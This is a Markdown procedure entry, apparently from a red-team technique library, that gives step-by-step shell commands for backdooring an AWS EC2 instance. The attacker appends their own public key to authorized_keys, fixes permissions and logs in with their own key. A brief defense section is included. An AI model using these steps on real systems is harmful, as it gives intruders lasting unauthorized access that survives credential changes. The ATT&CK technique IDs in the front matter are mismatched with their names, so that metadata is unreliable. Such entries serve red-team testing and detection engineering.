---
id: 6e925707-c166-4217-85ed-c8c853d6417c
name: AWS-SSH-Persistence-using-Public-Key
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.680892+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Modify-Authentication-Process|T1578 - Modify Authentication
    Process]]
sub_techniques:
  - >-
    [[techniques/Modify-Authentication-Process/SSH-Authorized-Keys|T1578.004 -
    SSH Authorized Keys]]
tags:
  - cloud-aws
  - persistence
  - ssh
commands:
  - '[[commands/ssh-login-to-aws-instance]]'
  - '[[commands/create-ssh-directory]]'
  - '[[commands/append-public-key-to-authorized-keys]]'
  - '[[commands/set-ssh-permissions]]'
  - '[[commands/verify-ssh-access]]'
platforms:
  - Linux
  - AWS
tools: []
validated: true
---

# AWS-SSH-Persistence-using-Public-Key

## Summary

This procedure establishes persistent SSH access to an AWS EC2 instance by appending an attacker's public key to the target's authorized_keys file. It allows continued access even if original credentials are revoked or changed, enabling long-term presence for data exfiltration or further compromise.

## Description

In AWS environments, EC2 instances often use SSH for remote access with key-based authentication. Attackers with initial shell access can modify the ~/.ssh/authorized_keys file to include their own public key, creating a backdoor. This technique targets Linux-based instances (common in AWS) and assumes the target user has write permissions to their home directory. Once added, the attacker can SSH using their private key from any controlled host. This is particularly effective in cloud settings where instance metadata or IAM roles may grant elevated privileges. Detection relies on monitoring file changes and anomalous SSH logins.

## Requirements

1. Initial SSH access to the target AWS EC2 instance using existing credentials or keys.
2. Attacker's public/private key pair generated (e.g., via ssh-keygen).
3. Write permissions on the target user's home directory (~/.ssh).
4. Network connectivity to the instance's security group allowing SSH (port 22).
5. Basic Linux command-line knowledge.

## Defense

- Restrict SSH access via AWS Security Groups and IAM policies to trusted IPs only.
- Enable AWS CloudTrail and GuardDuty to monitor SSH-related API calls and file changes.
- Use tools like OSSEC or Falco to alert on modifications to ~/.ssh/authorized_keys.
- Implement key rotation policies and disable password authentication in sshd_config.
- Regularly audit authorized_keys files and use bastion hosts for access.

## Objectives

1. Add attacker's public key to maintain SSH access post-compromise.
2. Ensure persistence despite credential changes or reboots.
3. Enable remote command execution for ongoing operations like lateral movement.

## Instructions

### Step 1: Gain Initial Access to the Instance

**Context**: Establish a shell on the target AWS EC2 instance using existing credentials to prepare for key modification. This step assumes you have the instance's public DNS or IP and valid login details.

**Command** ([[commands/ssh-login-to-aws-instance]]):
```bash
ssh -i existing_private_key ec2-user@ec2-instance-public-dns
```

> This command connects to the instance. Replace `existing_private_key` with your current access key file, `ec2-user` with the target username (e.g., ubuntu or ec2-user), and `ec2-instance-public-dns` with the instance's address. Expected output includes a successful login prompt like `ec2-user@ip-xxx-xxx-xxx-xxx:~$`.

### Step 2: Create SSH Directory if Necessary

**Context**: Ensure the ~/.ssh directory exists for storing authorized keys. This prevents errors when appending the key file.

**Command** ([[commands/create-ssh-directory]]):
```bash
mkdir -p ~/.ssh
```

> Run this after logging in. The `-p` flag creates the directory without errors if it already exists. Expected output: No output on success, or `mkdir: cannot create directory` if permissions are insufficient (indicating need for privilege escalation).

### Step 3: Append Attacker's Public Key

**Context**: Add the attacker's public key to the authorized_keys file. The public key content must be prepared in advance (e.g., copied from id_rsa.pub) and pasted or echoed into the file.

**Command** ([[commands/append-public-key-to-authorized-keys]]):
```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD... attacker@example.com" >> ~/.ssh/authorized_keys
```

> Replace the echoed key string with your actual public key (starts with ssh-rsa or similar). This appends it to the file. Expected output: No output on success. Verify with `cat ~/.ssh/authorized_keys` to see the key added at the end.

### Step 4: Set Proper Permissions

**Context**: Secure the .ssh directory and authorized_keys file to comply with SSH daemon requirements, preventing access denial due to lax permissions.

**Command** ([[commands/set-ssh-permissions]]):
```bash
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

> This sets directory permissions to owner-only (700) and file to owner-read/write (600). Expected output: No output on success. SSH will reject connections if permissions are too permissive.

### Step 5: Verify Persistence

**Context**: Test the backdoor by attempting SSH from the attacker's private key in a new session, confirming the modification works.

**Command** ([[commands/verify-ssh-access]]):
```bash
ssh -i attacker_private_key ec2-user@ec2-instance-public-dns
```

> Use a new terminal. Replace `attacker_private_key` with your new key file. Expected output: Successful login without prompting for existing credentials, confirming persistence.
